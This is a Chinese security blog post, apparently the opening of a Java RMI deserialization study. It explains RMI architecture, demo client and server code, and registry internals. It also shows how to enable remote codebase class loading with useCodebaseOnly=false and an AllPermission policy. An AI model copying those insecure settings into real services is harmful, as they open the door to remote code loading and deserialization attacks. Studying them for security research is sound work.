<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Java RMI反序列化深度解析 | B1ueL0n3's blog</title><meta name="author" content="B1ueL0n3"><meta name="copyright" content="B1ueL0n3"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="RPCRemote Procedure Call，远程过程调用。像本地调用方法一样调用一个远程方法。 RMI概念RMI，全程Remote Method Invocation，远程方法调用，一种用于实现远程过程调用的应用编程接口。 它使客户端上运行的程序可以调用远程服务器上对象的方法，即通过某个java虚拟机上的对象来调用另一个java虚拟机中对象的方法。 客户端获取的是远程主机上对象的引用，无论何">
<meta property="og:type" content="article">
<meta property="og:title" content="Java RMI反序列化深度解析">
<meta property="og:url" content="https://b1uel0n3.github.io/archives/9738c3bd/index.html">
<meta property="og:site_name" content="B1ueL0n3&#39;s blog">
<meta property="og:description" content="RPCRemote Procedure Call，远程过程调用。像本地调用方法一样调用一个远程方法。 RMI概念RMI，全程Remote Method Invocation，远程方法调用，一种用于实现远程过程调用的应用编程接口。 它使客户端上运行的程序可以调用远程服务器上对象的方法，即通过某个java虚拟机上的对象来调用另一个java虚拟机中对象的方法。 客户端获取的是远程主机上对象的引用，无论何">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://b1uel0n3.github.io/img/16.png">
<meta property="article:published_time" content="2025-09-27T12:12:03.000Z">
<meta property="article:modified_time" content="2025-10-03T06:51:48.844Z">
<meta property="article:author" content="B1ueL0n3">
<meta property="article:tag" content="RMI">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://b1uel0n3.github.io/img/16.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Java RMI反序列化深度解析",
  "url": "https://b1uel0n3.github.io/archives/9738c3bd/",
  "image": "https://b1uel0n3.github.io/img/16.png",
  "datePublished": "2025-09-27T12:12:03.000Z",
  "dateModified": "2025-10-03T06:51:48.844Z",
  "author": [
    {
      "@type": "Person",
      "name": "B1ueL0n3",
      "url": "https://b1uel0n3.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/toux.jpg"><link rel="canonical" href="https://b1uel0n3.github.io/archives/9738c3bd/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Java RMI反序列化深度解析',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/28.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/" title="回到主页"><span class="site-name">B1ueL0n3's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Java RMI反序列化深度解析</span></a><!--鼠标下滑时的文章标题显示--></span><div class="mask-name-container"><center id="name-container"><a id="page-name" href="javascript:btf.scrollToDest(0, 500)"></a></center></div><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Java RMI反序列化深度解析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-27T12:12:03.000Z" title="发表于 2025-09-27 20:12:03">2025-09-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-03T06:51:48.844Z" title="更新于 2025-10-03 14:51:48">2025-10-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/java%E5%AE%89%E5%85%A8/">java安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/java%E5%AE%89%E5%85%A8/Java%E5%9F%BA%E7%A1%80/">Java基础</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">8.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>32分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>Remote Procedure Call，远程过程调用。像本地调用方法一样调用一个远程方法。</p>
<h2 id="RMI概念"><a href="#RMI概念" class="headerlink" title="RMI概念"></a>RMI概念</h2><p>RMI，全程Remote Method Invocation，远程方法调用，一种用于实现远程过程调用的应用编程接口。</p>
<p>它使客户端上运行的程序可以调用远程服务器上对象的方法，即通过某个java虚拟机上的对象来调用另一个java虚拟机中对象的方法。</p>
<p>客户端获取的是远程主机上对象的引用，无论何处使用引用，方法调用都发生在原始对象上</p>
<p>RMI实现了RPC，通常使用Java原生反序列化，并且可以结合动态类加载和安全管理器来安全传输一个Java类。</p>
<h2 id="远程对象和非远程对象"><a href="#远程对象和非远程对象" class="headerlink" title="远程对象和非远程对象"></a>远程对象和非远程对象</h2><p>远程对象：RMI中的远程对象首先需要可以序列化；并且需要实现特殊远程接口的对象，该接口指定可以远程调用对象的哪些方法；其次该对象是通过一种可以通过网络传递的特殊对象引用来使用的。和普通的 Java 对象一样，远程对象是通过引用传递。也就是在调用远程对象的方法时是通过该对象的引用完成的。</p>
<p>非远程对象：非远程对象与远程对象相比只是可被序列化而已，并不会像远程对象那样通过调用远程对象的引用来完成调用方法的操作，而是将非远程对象做一个简单地拷贝，也就是说非远程对象是通过拷贝进行传递。</p>
<h2 id="Stub和Skeleton"><a href="#Stub和Skeleton" class="headerlink" title="Stub和Skeleton"></a>Stub和Skeleton</h2><p>RMI引入Stub（客户端存根）和Skeleton（服务端骨架）两个概念。</p>
<p>当我们在远程对象上调用方法，实际上是调用一些本地代码作为该对象的代理。也就是当客户端试图调用一个远端对象，实际上会调用客户端本地的一个代理类，也就是Stub。而在调用服务器端的目标类之前，也会经过一个对应的代理类，也就是Skeleton。它从Stub接受远程方法调用并将他们传递给对象。</p>
<h2 id="RMI架构"><a href="#RMI架构" class="headerlink" title="RMI架构"></a>RMI架构</h2><ul>
<li>client：客户端，发起远程调用请求，持有Stub作为远程对象的本地代理</li>
<li>server：服务端，提供远程服务，通过Skeleton接受并处理请求</li>
<li>Registry：注册中心，存储服务名称与远程对象引用的映射，类似于RMI的电话薄。类似于一个网关，自己并不执行远程方法。但服务器可以在上面注册一个Name到对象的绑定关系。客户端通过Name向注册中心查询，得到绑定关系后，再链接到服务端。使用注册中心查找对另一台主机上已经注册远程对象的引用。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/o_241125134804_rmi0.png" alt="img"></p>
<h2 id="实现接口和类"><a href="#实现接口和类" class="headerlink" title="实现接口和类"></a>实现接口和类</h2><h3 id="远程接口"><a href="#远程接口" class="headerlink" title="远程接口"></a>远程接口</h3><p>该接口指定可以远程调用远程对象的哪些方法。远程接口必须继承java.rmi.Remote接口，远程对象将实现这个远程接口。</p>
<p>注意即使是public修饰字段都不能通过远程接口来进行访问，如果需要访问，可通过编写一些setter和getter方法</p>
<p>远程接口中所以方法都需要抛出java.rmi.RemoteException异常</p>
<h3 id="java-rmi-Remote接口"><a href="#java-rmi-Remote接口" class="headerlink" title="java.rmi.Remote接口"></a>java.rmi.Remote接口</h3><p>java.rmi.Remotie接口用于标识可从非本地虚拟机调用其方法的接口。作为远程对象必须直接或间接实现该接口。只有那些实现了远程接口（java.rmi.Remote接口或继承java.rmi.Remote接口）的方法才能被远程调用。如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果服务端实现该接口并重写了该方法就能被调用</p>
<h3 id="java-rmi-server-UnicastRemoteObject类"><a href="#java-rmi-server-UnicastRemoteObject类" class="headerlink" title="java.rmi.server.UnicastRemoteObject类"></a>java.rmi.server.UnicastRemoteObject类</h3><p>RMI提供了一些远程对象实现可以继承的便利类，这些类有助于远程对象的创建，其中包括java.rmi.server.UnicastRemoteObject类。</p>
<p>通常远程对象类需要继承java.rmi.server.UnicastRemoteObject类，在RMI中 UnicastRemoteObject类是与Object超类等效的，该类提供了<code>equals( )</code> , <code>hashcode( )</code>, <code>toString( )</code>方法；并且在RMI运行时，继承UnicastRemoteObject类的子类会被<code>exports</code> 出去，绑定随机端口，开始监听来自客户端（Stubs）的请求。</p>
<p>而如果去掉该类，就无法生成Stub代理对象，而RMI注册表Registry在绑定对象时需要传递Stub对象，则导致序列化对象时对象未导出使序列化错误。</p>
<h2 id="RMI动态加载类"><a href="#RMI动态加载类" class="headerlink" title="RMI动态加载类"></a>RMI动态加载类</h2><p>前面说过RMI可使用动态加载类和安全管理器来安全传输Java类</p>
<p>在RMI过程中客户端和服务器数据传输有以下特点：</p>
<p>RMI的客户端和服务端是通过将数据进行序列化来传输的，所以当我们传递一个可序列化的对象作为参数进行传输时，在服务端肯定会对其进行反序列化。</p>
<p>在RMI的动态加载类机制中，如果需要用到某个类但JVM中没有这个类，它可以通过远程URL去下载这个类。那么这个URL可以是http、ftp协议，加载时可以加载某个第三方类库jar包下的类，或者在指定URL时在最后以<code>\</code>结束来指定目录，从而通过类名加载该目录下的指定类。</p>
<p>RMI动态加载时用到的是<code>java.rmi.server.codebase</code>属性，该属性表示一个或多个URL位置，可以从中下载本地（CLASSPATH）找不到的类，相当于一个代码库。</p>
<p>设置<code>java.rmi.server.codebase</code>属性：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>,<span class="string">&quot;http://127.0.0.1:5432/&quot;</span>);</span><br><span class="line">或</span><br><span class="line">java -Djava.rmi.server.codebase=<span class="string">&quot;http://127.0.0.1:5432/&quot;</span></span><br></pre></td></tr></table></figure>

<p>对于客户端而言，如果服务端方法的返回值可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，客户端就需要从服务端提供的<code>java.rmi.server.codebase</code>URL去加载类。</p>
<p>对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的子类，那么服务端需要从客户端提供的<code>java.rmi.server.codebase</code>URL去加载对应的类。</p>
<p>客户端与服务端两边的<code>java.rmi.server.codebase</code>URL都是互相传递的。</p>
<p>但无论是客户端还是服务端要远程加载类，都需要满足：</p>
<ul>
<li>由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要远程加载类，需要安装RMISecurityManager并配置java.security.policy</li>
<li>属性java.rmi.server.useCodebaseOnly的值必须为false</li>
</ul>
<p>有三种方法配置policy：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//client.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">java -Djava.security.policy=rmi.policy</span><br><span class="line"></span><br><span class="line">System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, RemoteServer.class.getClassLoader().getResource(<span class="string">&quot;rmi.policy&quot;</span>).toString());</span><br></pre></td></tr></table></figure>

<h2 id="RMI-Demo"><a href="#RMI-Demo" class="headerlink" title="RMI Demo"></a>RMI Demo</h2><h3 id="接口实现"><a href="#接口实现" class="headerlink" title="接口实现"></a>接口实现</h3><p>先定义一个远程接口，远程接口定义我们需要使用的方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>服务端需要在注册中心注册远程对象，所以一般服务端和注册中心registry一起的。</p>
<p>先定义一个实现该接口的类来重写Hello方法，即我们的远程对象：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMItest</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RMItest</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后注册一个Name，在注册中心绑定远程对象：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">server</span> &#123;</span><br><span class="line">    <span class="comment">//rmi服务地址</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String HOST=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> PORT=<span class="number">5432</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String RMI_PATH=<span class="string">&quot;/b1uel0n3&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String RMI_NAME=<span class="string">&quot;rmi://&quot;</span>+HOST+<span class="string">&quot;:&quot;</span>+PORT+RMI_PATH;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//注册RMI端口</span></span><br><span class="line">        LocateRegistry.createRegistry(PORT);</span><br><span class="line">        <span class="comment">//绑定远程对象</span></span><br><span class="line">        RMIInterface o=<span class="keyword">new</span> <span class="title class_">RMItest</span>();</span><br><span class="line">        Naming.rebind(RMI_NAME,o);</span><br><span class="line">        System.out.println(<span class="string">&quot;RMI服务在：&quot;</span>+RMI_NAME);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>向注册中心查询相应的Name，并调用远程对象的方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> rmi.server.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(HOST,PORT);</span><br><span class="line">        System.out.println(Arrays.toString(registry.list()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//寻找对应RMI实例</span></span><br><span class="line">        RMIInterface o=(RMIInterface) Naming.lookup(RMI_NAME);</span><br><span class="line">        <span class="comment">//调用远程对象的方法</span></span><br><span class="line">        System.out.println(o.Hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先启动服务端RMI服务，运行服务端代码，然后运行客户端查询并调用远程对象方法：<br>服务端：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250708205555204.png" alt="image-20250708205555204"></p>
<p>客户端：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250708205611753.png" alt="image-20250708205611753"></p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h4><h5 id="定义rmi服务器地址"><a href="#定义rmi服务器地址" class="headerlink" title="定义rmi服务器地址"></a>定义rmi服务器地址</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//rmi服务地址</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String HOST=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> PORT=<span class="number">5432</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String RMI_PATH=<span class="string">&quot;/b1uel0n3&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String RMI_NAME=<span class="string">&quot;rmi://&quot;</span>+HOST+<span class="string">&quot;:&quot;</span>+PORT+RMI_PATH;</span><br></pre></td></tr></table></figure>

<p>这部分是为了定义rmi的服务器地址</p>
<h5 id="创建RMI注册中心"><a href="#创建RMI注册中心" class="headerlink" title="创建RMI注册中心"></a>创建RMI注册中心</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(PORT);</span><br></pre></td></tr></table></figure>

<p>跟进一下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709144331339.png" alt="image-20250709144331339"></p>
<p>LocateRegistry.createRegistry方法会返回一个RegistryImpl对象，继续跟进：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709144502024.png" alt="image-20250709144502024"></p>
<p>这里if和else逻辑是相似的，都会创建一个LiveRef对象，port传入作为注册中心的端口，LiveRef是一个网络引用的类，用于网络请求方面，后面会提到，这里我们传入了端口。</p>
<p>然后将其封装进UnicastServerRef对象，随后调用RegistryImpl.setup方法传入UnicastServerRef对象，所以注意这个LiveRef在后面的分析中都会存在：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709145113967.png" alt="image-20250709145113967"></p>
